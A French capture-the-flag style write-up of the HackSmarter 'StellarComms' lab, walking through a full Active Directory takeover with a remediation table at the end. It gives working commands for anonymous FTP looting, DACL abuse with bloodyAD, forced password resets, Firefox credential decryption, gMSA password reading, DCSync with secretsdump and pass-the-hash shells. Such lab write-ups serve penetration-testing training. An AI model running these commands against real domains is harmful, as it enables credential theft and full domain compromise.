---
title: "StellarComms — HackSmarter AD Writeup"
date: 2026-05-12
categories: [HackSmarter, Active Directory]
tags: [AD, BloodHound, DCSync, gMSA, WriteOwner, WinRM, Firefox]
---

# StellarComms — Writeup

**Lab :** HackSmarter  
**Difficulté :** Medium  
**Cible :** DC-STELLAR.stellarcomms.local — 10.1.235.7  
**OS :** Windows Server 2019

---

## Objectif

A partir d'un simple nom d'utilisateur (`junior.analyst`)  sans mot de passe connu, l'objectif est de compromettre entièrement le domaine `stellarcomms.local` et d'obtenir un accès en tant que Domain Admin.

---

## Chaîne d'attaque

```
FTP anonyme → mot de passe par défaut → junior.analyst
    ↓
BloodHound → WriteOwner → stellarops-control → ops.controller (WinRM)
    ↓
Firefox credentials → astro.researcher
    ↓
WriteDACL → eng.payload → ReadGMSAPassword → satlink-service$
    ↓
DCSync → hash Administrator → Domain Admin 🏆
```

---

## 1. Reconnaissance

### 1.1 Scan de ports

**Cible :** 10.1.235.7

On commence par un scan rapide des ports ouverts avec **rustscan**, puis on passe les résultats à **nmap** pour la détection des services.

Rustscan est un scanner de ports ultra-rapide écrit en Rust. Il envoie des milliers de paquets en parallèle pour découvrir les ports ouverts en quelques secondes, puis passe automatiquement les résultats à nmap pour la détection des services et versions. C'est le meilleur des deux mondes : la vitesse de rustscan + la puissance de nmap.

```bash
rustscan -b 500 -a 10.1.235.7 -- -sC -sV -Pn
```

| Option | Description |
|--------|-------------|
| `-b 500` | Batch size — 500 ports scannés simultanément |
| `-a` | Adresse cible |
| `--` | Tout ce qui suit est passé directement à nmap |
| `-sC` | Scripts NSE par défaut |
| `-sV` | Détection des versions de services |
| `-Pn` | Traite la cible comme online sans ping ICMP |

Pour ce cas l'utilisation de nmap toute seule a été suffisante.

![scan-rustscan-nmap-results](/assets/img/posts/stellarcomms/scan-rustscan-nmap-results.png)

La présence combinée de plusieurs ports caractéristiques confirme qu'on est face à un **Domain Controller** :

| Port | Service | Rôle |
|------|---------|------|
| 21 | FTP | Transfert de fichiers |
| 53 | DNS | Résolution de noms du domaine |
| 88 | Kerberos | Authentification AD |
| 135/593 | MSRPC | Communication inter-processus Windows |
| 139/445 | SMB | Partage de fichiers, authentification |
| 389/636 | LDAP/LDAPS | Annuaire AD |
| 464 | Kpasswd | Changement de mot de passe Kerberos |
| 3268/3269 | Global Catalog | Recherche inter-domaines |
| 3389 | RDP | Bureau à distance |
| 5985 | WinRM | Administration distante PowerShell |
| 9389 | ADWS | Active Directory Web Services |

Le service **Kerberos sur le port 88** est le signal le plus fort, ce protocole est uniquement présent sur les DCs. Nmap confirme le nom de domaine : `stellarcomms.local`.

---

### 1.2 Enumération FTP — Découverte du mot de passe par défaut

On découvre un serveur **FTP sur le port 21**. FTP (File Transfer Protocol) est un protocole de transfert de fichiers entre un client et un serveur. Il est ancien, non chiffré par défaut, et encore très présent dans les environnements d'entreprise pour partager des documents internes.

Le premier réflexe est de tester la **connexion anonyme**. Ce mode permet de se connecter sans credentials valides, en utilisant `anonymous` comme nom d'utilisateur et n'importe quelle valeur comme mot de passe. C'est une configuration souvent laissée active par erreur ou négligence.

```bash
ftp 10.1.235.7
# Name : anonymous
# Password : (entrée vide)
```

![ftp-anonymous-login-success](/assets/img/posts/stellarcomms/ftp-anonymous-login-success.png)

La connexion anonyme est acceptée. On trouve trois dossiers : `Docs`, `IT`, et `Pics`. On télécharge tout le contenu du dossier `Docs` :

```bash
ftp> cd Docs
ftp> prompt off
ftp> mget *
```

Parmi les fichiers, on trouve `Stellar_UserGuide.pdf`, un document d'onboarding contenant un **mot de passe par défaut** pour les nouveaux comptes.

![pdf-onboarding-default-password](/assets/img/posts/stellarcomms/pdf-onboarding-default-password.png)

> **Note :** Les documents d'onboarding sont une cible classique en pentest. Les entreprises y incluent souvent des mots de passe temporaires qui ne sont jamais changés.

---

## 2. Accès initial — junior.analyst

On teste si le compte `junior.analyst` utilise le mot de passe par défaut trouvé dans le PDF. On utilise **NetExec (nxc)** pour valider les credentials contre SMB :

```bash
nxc smb DC-STELLAR.stellarcomms.local -u 'junior.analyst' -p 'Galaxy123!'
```

![nxc-smb-junior-analyst-valid](/assets/img/posts/stellarcomms/nxc-smb-junior-analyst-valid.png)

Authentification réussie ✅

On génère ensuite l'entrée `/etc/hosts` pour résoudre `stellarcomms.local` :

```bash
echo "10.1.235.7 DC-STELLAR.stellarcomms.local stellarcomms.local DC-STELLAR" | sudo tee -a /etc/hosts
```

---

## 3. Enumération AD — BloodHound

Avec le compte valide, on a énuméré les objets de l'AD avec BloodHound.

BloodHound est un outil d'analyse de l'Active Directory qui cartographie toutes les relations entre objets (utilisateurs, groupes, ordinateurs, GPO…) et les permissions associées. Il collecte les données via LDAP et les stocke dans une base de données graphe **Neo4j**.

```bash
bloodhound-ce.py --zip -c All \
  -d stellarcomms.local \
  -u 'junior.analyst' \
  -p 'Galaxy123!' \
  -dc DC-STELLAR.stellarcomms.local \
  -ns 10.1.235.7
```

On a trouvé que `junior.analyst` a le droit **WriteOwner** sur le groupe `STELLAROPS-CONTROL`, et ce dernier a le droit **ForceChangePassword** sur `ops.controller`, qui est membre du groupe **Remote Management Users**.

Dans l'Active Directory, chaque objet possède un **propriétaire** qui peut modifier ses permissions à volonté. Le droit **WriteOwner** permet de changer ce propriétaire. En se définissant propriétaire du groupe `STELLAROPS-CONTROL`, on peut ensuite se donner `GenericAll` dessus, s'y ajouter comme membre, et ainsi hériter de la permission `ForceChangePassword` sur `ops.controller`.

```
WriteOwner sur le groupe
    ↓
On se définit propriétaire → on se donne GenericAll
    ↓
On s'ajoute au groupe → on hérite de ForceChangePassword
    ↓
On réinitialise le mot de passe de ops.controller
    ↓
ops.controller est dans Remote Management Users = accès WinRM
    ↓
Shell sur le DC via evil-winrm 🎯
```

---

## 4. Pivot vers ops.controller — Abus de droits DACL

### Le droit WriteOwner

On peut vérifier la permission `ForceChangePassword` avec `dacledit.py` :

```bash
dacledit.py -action read \
  -target 'ops.controller' \
  -dc-ip 10.1.235.7 \
  stellarcomms.local/junior.analyst:'Galaxy123!'
```

![dacledit-forcechangepassword-stellarops-control](/assets/img/posts/stellarcomms/dacledit-forcechangepassword-stellarops-control.png)

```
ACE[0] : StellarOps-Control → User-Force-Change-Password → ops.controller ✅
```

### Exploitation

**Étape 1 — Devenir propriétaire du groupe :**

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local \
  -d stellarcomms.local \
  -u 'junior.analyst' -p 'Galaxy123!' \
  set owner 'stellarops-control' 'junior.analyst'
```

**Étape 2 — Se donner GenericAll :**

En tant que propriétaire, on modifie le DACL pour s'accorder `GenericAll`, contrôle total sur l'objet.

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local \
  -d stellarcomms.local \
  -u 'junior.analyst' -p 'Galaxy123!' \
  add genericAll 'stellarops-control' 'junior.analyst'
```

**Étape 3 — S'ajouter au groupe :**

Avec `GenericAll`, on s'ajoute comme membre du groupe pour hériter de `ForceChangePassword` sur `ops.controller`.

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local \
  -d stellarcomms.local \
  -u 'junior.analyst' -p 'Galaxy123!' \
  add groupMember 'stellarops-control' 'junior.analyst'
```

**Étape 4 — Réinitialiser le mot de passe :**

`ForceChangePassword` permet de réinitialiser le mot de passe d'un utilisateur **sans connaître l'ancien**. C'est une permission AD légitime utilisée par les admins, mais qu'on abuse ici.

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local \
  -d stellarcomms.local \
  -u 'junior.analyst' -p 'Galaxy123!' \
  set password 'ops.controller' 'Pwned123@!'
```

![bloodyad-chain-writeowner-to-forcechangepassword](/assets/img/posts/stellarcomms/bloodyad-chain-writeowner-to-forcechangepassword.png)

### Shell WinRM

`ops.controller` est membre du groupe **Remote Management Users**, ce qui autorise la connexion via **WinRM** (port 5985), le protocole de gestion à distance PowerShell de Windows.

```bash
evil-winrm -i DC-STELLAR.stellarcomms.local \
  -u 'ops.controller' \
  -p 'Pwned123@!'
```

**User flag :** `C:\Users\ops.controller\Desktop\user.txt` ✅

---

## 5. Pivot vers astro.researcher — Extraction des credentials Firefox

### Pourquoi chercher Firefox ?


Le dossier `IT` du FTP contenait un installeur `Firefox Setup 91.0esr.exe`. Firefox ESR est installé sur la machine et un utilisateur a probablement sauvegardé ses credentials dans le navigateur.

### Les fichiers logins.json et key4.db

Firefox stocke les credentials sauvegardés dans deux fichiers présents dans le profil utilisateur :

- **`logins.json`** — les identifiants et mots de passe **chiffrés**
- **`key4.db`** — la base de données SQLite contenant la **clé de déchiffrement**

Sans les deux fichiers ensemble, impossible de récupérer les mots de passe en clair.

```
C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\<profil>\
```

On liste les profils disponibles :

```powershell
ls C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\
```

On identifie le profil `v8mn7ijj.default-esr` comme non vide. On télécharge les deux fichiers :

```powershell
cd C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr
download logins.json
download key4.db
```

![firefox-profiles-listing](/assets/img/posts/stellarcomms/firefox-profiles-listing.png)


### Déchiffrement avec firepwd

On utilise l'outil **firepwd** pour déchiffrer les credentials :

```bash
git clone https://github.com/lclevy/firepwd
cd firepwd
pip install -r requirements.txt --break-system-packages
python firepwd.py -d v8mn7ijj.default-esr
```

![firepwd-astro-researcher-credentials](/assets/img/posts/stellarcomms/firepwd-astro-researcher-credentials.png)

Les credentials de `astro.researcher` sont récupérés en clair ✅

---

## 6. Pivot vers eng.payload — WriteDACL

### Le droit WriteDACL

Dans l'Active Directory, chaque objet possède une **DACL** (Discretionary Access Control List), la liste qui définit qui a le droit de faire quoi sur cet objet. **WriteDACL** permet de modifier cette liste.

BloodHound révèle que `astro.researcher` a `WriteDACL` sur `eng.payload`. En s'accordant `GenericAll` sur ce compte, on peut ensuite forcer un reset de mot de passe sans connaître l'ancien.

**Étape 1 — Se donner GenericAll sur eng.payload :**

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local \
  -d stellarcomms.local \
  -u 'astro.researcher' -p 'Cosmos@42' \
  add genericAll 'eng.payload' 'astro.researcher'
```

**Étape 2 — Réinitialiser le mot de passe :**

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local \
  -d stellarcomms.local \
  -u 'astro.researcher' -p 'Cosmos@42' \
  set password 'eng.payload' 'Hacked123!'
```

![bloodyad-writedacl-eng-payload](/assets/img/posts/stellarcomms/bloodyad-writedacl-eng-payload.png)

---

## 7. Lecture du mot de passe gMSA — ReadGMSAPassword

### C'est quoi un gMSA ?

Un **gMSA** (group Managed Service Account) est un compte de service spécial dans l'AD, utilisé par des services Windows (IIS, tâches planifiées…) pour s'authentifier. Sa particularité : son mot de passe est **géré automatiquement par l'AD** — il change régulièrement et les humains ne le connaissent jamais.

### Le droit ReadGMSAPassword

C'est la permission de lire ce mot de passe automatique depuis l'attribut `msDS-ManagedPassword` du compte gMSA. Normalement seuls certains comptes/groupes autorisés peuvent le lire, configurés dans `msDS-GroupMSAMembership`.

BloodHound confirme que `eng.payload` a `ReadGMSAPassword` sur `satlink-service$` :

![bloodhound-readgmsapassword-satlink-service](/assets/img/posts/stellarcomms/bloodhound-readgmsapassword-satlink-service.png)

On lit directement le NT hash de `satlink-service$` :

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local \
  -d stellarcomms.local \
  -u 'eng.payload' -p 'Hacked123!' \
  get object 'satlink-service$' --attr msDS-ManagedPassword
```

![bloodyad-gmsa-nt-hash-satlink](/assets/img/posts/stellarcomms/bloodyad-gmsa-nt-hash-satlink.png)

---

## 8. DCSync — Domain Admin

### Le droit DCSync

`satlink-service$` possède les permissions `GetChanges`, `GetChangesAll` et `GetChangesInFilteredSet` sur l'objet domaine `STELLARCOMMS.LOCAL`.

![bloodhound-dcsync-satlink-service](/assets/img/posts/stellarcomms/bloodhound-dcsync-satlink-service.png)

Ces trois permissions ensemble permettent de simuler une **réplication de domaine** (DCSync). Concrètement, on imite le comportement d'un DC secondaire qui demande au DC principal de lui envoyer tous les credentials  y compris les NT hashes de tous les comptes du domaine.

```bash
impacket-secretsdump \
  -hashes :NT_HASH_SATLINK \
  -dc-ip 10.1.235.7 \
  'stellarcomms.local/satlink-service$@DC-STELLAR.stellarcomms.local'
```
On récupère le NT hash de `Administrator`.

### Pass-the-Hash — Shell Domain Admin

Avec le NT hash de l'Administrator, on s'authentifie via **Pass-the-Hash** sans connaître le mot de passe en clair :

```bash
evil-winrm -i DC-STELLAR.stellarcomms.local \
  -u 'Administrator' \
  -H 'NT_HASH_ADMINISTRATOR'
```

![evil-winrm-administrator-domain-admin-shell](/assets/img/posts/stellarcomms/evil-winrm-administrator-domain-admin-shell.png)

**Root flag :** `C:\Users\Administrator\Desktop\root.txt` 🏆

---

## Recommandations

| Finding | Recommandation |
|---------|----------------|
| FTP anonyme avec documents sensibles | Désactiver la connexion anonyme. Ne jamais stocker de mots de passe dans des documents accessibles sans authentification |
| Mot de passe par défaut non changé | Forcer le changement de mot de passe à la première connexion et appliquer une politique de mots de passe forts |
| WriteOwner mal configuré sur groupe AD | Auditer régulièrement les ACLs des objets AD avec BloodHound. Appliquer le principe du moindre privilège |
| ForceChangePassword accordé à un groupe | Restreindre ce droit aux seuls administrateurs. Aucun groupe opérationnel ne devrait avoir ce droit sur des comptes actifs |
| Credentials sauvegardés dans Firefox | Interdire le stockage de credentials dans les navigateurs via GPO. Utiliser un gestionnaire de mots de passe d'entreprise |
| WriteDACL accordé à un utilisateur sur un autre compte | Auditer et supprimer les droits WriteDACL non justifiés. Appliquer le principe du moindre privilège |
| gMSA lisible par un compte compromettable | Restreindre `msDS-GroupMSAMembership` aux seuls services qui en ont besoin. Auditer qui peut lire les mots de passe gMSA |
| DCSync accordé à un compte de service | Les droits de réplication ne doivent être accordés qu'aux Domain Controllers. Auditer les comptes avec `GetChangesAll` sur le domaine |

---

